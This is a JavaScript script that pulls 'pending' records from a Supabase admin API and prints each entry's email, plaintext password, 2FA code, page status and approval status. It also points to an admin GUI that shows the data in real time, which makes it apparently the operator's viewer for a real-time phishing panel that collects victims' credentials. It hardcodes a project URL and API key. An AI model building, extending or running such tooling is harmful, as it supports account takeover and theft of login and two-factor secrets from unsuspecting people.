// CHECK SUPABASE DATABASE DATA
console.log('🗄️ CHECKING SUPABASE DATABASE DATA');
console.log('==========================================\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

async function checkSupabaseData() {
    try {
        console.log('📊 Fetching all requests from Supabase...\n');
        
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, { headers });
        
        if (!response.ok) {
            console.log('❌ Failed to fetch data from Supabase');
            return;
        }
        
        const data = await response.json();
        
        console.log('✅ SUPABASE DATABASE STATUS:');
        console.log('==========================================');
        console.log('📊 Total Requests:', data.length);
        console.log('');
        
        if (data.length === 0) {
            console.log('⚠️ No data found in database');
            console.log('💡 This means live website is still using old code');
            return;
        }
        
        // Group by email to show unique users
        const emailGroups = {};
        data.forEach(req => {
            if (!emailGroups[req.email]) {
                emailGroups[req.email] = [];
            }
            emailGroups[req.email].push(req);
        });
        
        console.log('👥 UNIQUE EMAILS:', Object.keys(emailGroups).length);
        console.log('');
        
        // Show recent requests (last 5)
        const recent = data.slice(0, 5);
        console.log('🕒 RECENT REQUESTS:');
        console.log('==========================================');
        
        recent.forEach((req, index) => {
            console.log(`${index + 1}. 📧 ${req.email}`);
            console.log(`   🔐 Password: ${req.password || 'Not entered'}`);
            console.log(`   📱 2FA: ${req.twofa || 'Not entered'}`);
            console.log(`   📄 Page: ${req.pageStatus || 'Unknown'}`);
            console.log(`   ✅ Status: ${req.status || 'pending'}`);
            console.log(`   🕐 Time: ${new Date(req.createdAt).toLocaleString()}`);
            console.log('');
        });
        
        // Check for test data
        const testEmails = data.filter(req => 
            req.email.includes('test') || 
            req.email.includes('integration') ||
            req.email.includes('frontend') ||
            req.email.includes('live.website')
        );
        
        console.log('🧪 TEST DATA FOUND:', testEmails.length);
        if (testEmails.length > 0) {
            console.log('✅ Backend is receiving data correctly');
        }
        
        console.log('');
        console.log('🌐 SUPABASE CONSOLE:');
        console.log('https://supabase.com/dashboard/project/nqsdardermkzppeaazbb/editor');
        console.log('📊 You can also view data directly in Supabase dashboard');
        console.log('');
        console.log('📱 ADMIN GUI:');
        console.log('- Open: GUI Local/gui.html');
        console.log('- Should show all this data in real-time');
        
    } catch (error) {
        console.log('❌ Error checking Supabase data:', error.message);
    }
}

checkSupabaseData(); 